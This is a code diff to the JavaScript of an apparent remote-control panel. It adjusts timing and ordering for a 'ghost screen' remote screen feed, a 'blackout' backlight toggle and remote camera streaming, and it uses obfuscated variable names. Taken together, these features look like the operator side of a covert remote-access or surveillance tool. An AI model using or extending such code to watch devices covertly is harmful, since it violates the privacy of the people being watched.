@@ -701,7 +701,7 @@ function refreshGhostScreen() {
       if (_0x2a) {
         streamImg.src = img.src;
         if (statusCard) statusCard.style.display = "none";
-        setTimeout(refreshGhostScreen, _0x2b ? 5000 : 40);
+        setTimeout(refreshGhostScreen, _0x2b ? 5000 : 200);
       }
     };
     img.onerror = () => {
@@ -765,7 +765,7 @@ function toggleLock() {
 
 function toggleBlackout() {
   const isActivating = document.getElementById("blackout-btn").innerText.includes("ACTIVATE");
-  showToast(isActivating ? "BLACKOUT_MODE_ENGAGED" : "RESTORING_HARDWARE_BACKLIGHT...");
+  showToast(isActivating ? "BLACKOUT_PROTOCOL_ENGAGED" : "RESTORING_HARDWARE_BACKLIGHT...");
   fetch("/ghost/interact?action=" + (isActivating ? "blackout_on" : "blackout_off")).then(() => checkGhostStatus());
 }
 
@@ -1043,17 +1043,13 @@ function applyQuality(idx) {
 async function initiateStream(camId) {
   _0x3c = camId;
   _0x3a = true;
+  window.cameraStreamActive = true;
+
   const loading = document.getElementById("loading-overlay");
   if (loading) {
     loading.style.display = "block";
     loading.innerText = "INITIALIZING_CAMERA...";
   }
-
-  try {
-    await fetch("/camera/start-stream?cam=" + camId + "&width=" + _0x3d + "&height=" + _0x3e + "&quality=" + _0x3f);
-  } catch (e) {}
-
-  await new Promise(r => setTimeout(r, 400));
 
   const liveIndicator = document.getElementById("live-indicator");
   const dot = document.getElementById("indicator-dot");
@@ -1082,10 +1078,9 @@ async function initiateStream(camId) {
 
   const mainStream = document.getElementById("main-stream");
   if (mainStream) {
-    window.cameraStreamActive = true;
-    _0x3a = true;
-
-    if (loading) loading.style.display = "none";
+    try {
+      await fetch("/camera/start-stream?cam=" + camId + "&width=" + _0x3d + "&height=" + _0x3e + "&quality=" + _0x3f);
+    } catch (e) {}
 
     function refreshCameraFeed() {
       if (window.cameraStreamActive) {
@@ -1096,12 +1091,14 @@ async function initiateStream(camId) {
             mainStream.src = offscreenImg.src;
             mainStream.style.display = "block";
             if (loading) loading.style.display = "none";
-            setTimeout(refreshCameraFeed, 20);
+            setTimeout(refreshCameraFeed, 40);
           }
         };
         offscreenImg.onerror = () => {
           if (window.cameraStreamActive) setTimeout(refreshCameraFeed, 150);
         };
+      } else {
+        window.cameraLoopRunning = false;
       }
     }
 
@@ -1115,6 +1112,7 @@ async function initiateStream(camId) {
 function terminateCaptures() {
   _0x3a = false;
   window.cameraStreamActive = false;
+  window.cameraLoopRunning = false;
   fetch("/camera/stop-stream").catch(() => {});
   const mainStream = document.getElementById("main-stream");
   if (mainStream) {
